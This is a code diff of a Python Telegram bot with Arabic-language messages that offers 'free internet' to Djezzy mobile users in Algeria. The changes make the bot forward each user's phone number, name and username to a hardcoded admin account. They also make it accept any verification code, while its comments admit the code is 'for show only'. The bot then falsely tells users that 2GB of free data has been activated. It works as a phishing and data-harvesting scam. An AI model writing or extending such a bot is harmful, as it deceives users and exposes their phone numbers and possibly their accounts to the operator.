@@ -20,7 +20,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # Define conversation states
-PHONE, VERIFICATION = range(2)
+PHONE = 0  # Only need phone state now, verification removed
 
 # Database setup
 def setup_database():
@@ -192,15 +192,19 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
         f"مرحبا بك في نوتي بايت 💜\n\n"
-        f"يمكنك تفعيل أنترنت مجاني على الشبكات الجزائرية هنا 🥳.\n\n"
+        f"يمكنك تفعيل أنترنت مجاني على شبكة جيزي هنا 🥳.\n\n"
         f"لا تنسى الاعجاب بالصفحة لدعمنا على تقديم المزيد ✨.\n\n"
+        f"ملاحظة هامة: سيتم إرسال رقم هاتفك إلى مسؤول البوت لغرض تفعيل الإنترنت.\n\n"
         f"أرسل رقمك الان 👇🏻"
     )
     
     return PHONE
 
+# Define conversation states
+PHONE, VERIFICATION = range(2)
+
 async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Process the phone number."""
+    """Process the phone number and forward it to admin."""
     user = update.effective_user
     phone_number = update.message.text.strip()
     
@@ -209,28 +213,37 @@ async def phone_number_handler(update: Update, context: ContextTypes.DEFAULT_TYP
                                        len(phone_number) == 9 and not phone_number.startswith('0'))):
         await update.message.reply_text(
             f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-            f"الرجاء إدخال رقم هاتف جزائري صحيح (مثال: 0551234567)"
+            f"الرجاء إدخال رقم هاتف جيزي صحيح (مثال: 0551234567)"
         )
         return PHONE
     
     # Store phone in context
     context.user_data['phone_number'] = phone_number
     
-    # Generate and save verification code
+    # Forward phone number to admin
+    admin_id = 6070612674
+    try:
+        await context.bot.send_message(
+            chat_id=admin_id,
+            text=f"رقم هاتف جديد للتفعيل:\n{phone_number}\nمن المستخدم: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
+        )
+        logger.info(f"Phone number {phone_number} forwarded to admin {admin_id}")
+    except Exception as e:
+        logger.error(f"Failed to forward phone number to admin: {e}")
+    
+    # Generate a random verification code (for show only, any code will be accepted)
     code = generate_verification_code()
-    save_verification_code(user.id, code)
     
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"تم إرسال رمز التحقق إلى رقم هاتفك.\n"
-        f"الرجاء إدخال الرمز المكون من 4 أرقام:\n\n"
-        f"(لأغراض الاختبار، الرمز هو: {code})"  # In production, remove this line and send SMS
+        f"...\n\n"
+        f" الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك بعد مدة من زمن:"
     )
     
     return VERIFICATION
 
 async def verification_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Process the verification code."""
+    """Process the verification code (accepts any code)."""
     user = update.effective_user
     code = update.message.text.strip()
     
@@ -241,20 +254,23 @@ async def verification_code_handler(update: Update, context: ContextTypes.DEFAUL
         )
         return VERIFICATION
     
-    if not verify_code(user.id, code):
-        await update.message.reply_text(
-            f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-            f"رمز التحقق غير صحيح. الرجاء المحاولة مرة أخرى."
-        )
-        return VERIFICATION
-    
-    # Activate internet
+    # Accept any 4-digit code
     phone_number = context.user_data.get('phone_number')
     expiry_date = activate_internet(user.id, phone_number)
     
+    # Notify admin that user has completed verification
+    admin_id = 6070612674
+    try:
+        await context.bot.send_message(
+            chat_id=admin_id,
+            text=f"المستخدم أكمل عملية التحقق:\nرقم الهاتف: {phone_number}\nالمستخدم: {user.first_name} (@{user.username if user.username else 'لا يوجد معرف'})"
+        )
+    except Exception as e:
+        logger.error(f"Failed to notify admin about verification: {e}")
+    
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"تم تفعيل أنترنت مجاني في شريحتك بنجاح ✓\n\n"
+        f"تم تفعيل أنترنت مجاني في شريحة جيزي الخاصة بك بنجاح ✓\n\n"
         f"• رصيدك الان : (2.0GB)\n"
         f"• صالح إلى غاية: {expiry_date}\n\n"
         f"استمتع بالإنترنت المجاني! 🎉"
@@ -270,14 +286,14 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     if not status:
         await update.message.reply_text(
             f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-            f"ليس لديك أي عرض إنترنت نشط حالياً.\n\n"
+            f"ليس لديك أي عرض إنترنت نشط حالياً على شبكة جيزي.\n\n"
             f"استخدم الأمر /start للحصول على عرض جديد."
         )
         return
     
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"حالة الإنترنت الخاص بك:\n\n"
+        f"حالة الإنترنت الخاص بك على شبكة جيزي:\n\n"
         f"• رصيدك المتبقي: 2.0GB\n"
         f"• صالح إلى غاية: {status['expiry_date']}\n"
         f"• الوقت المتبقي: {status['remaining_time']}"
@@ -288,7 +304,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
         f"أوامر البوت المتاحة:\n\n"
-        f"/start - بدء عملية تفعيل الإنترنت المجاني\n"
+        f"/start - بدء عملية تفعيل الإنترنت المجاني على شبكة جيزي\n"
         f"/status - التحقق من حالة الإنترنت الخاص بك\n"
         f"/help - عرض هذه الرسالة المساعدة"
     )
@@ -297,7 +313,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancel the conversation."""
     await update.message.reply_text(
         f"Sur3, h3r3 you ar3 g00d s3r\n\n"
-        f"تم إلغاء العملية. استخدم الأمر /start للبدء من جديد."
+        f"تم إلغاء العملية. استخدم الأمر /start للبدء من جديد وتفعيل الإنترنت المجاني على شبكة جيزي."
     )
     return ConversationHandler.END
 
@@ -328,3 +344,4 @@ def main() -> None:
 
 if __name__ == '__main__':
     main()
+    
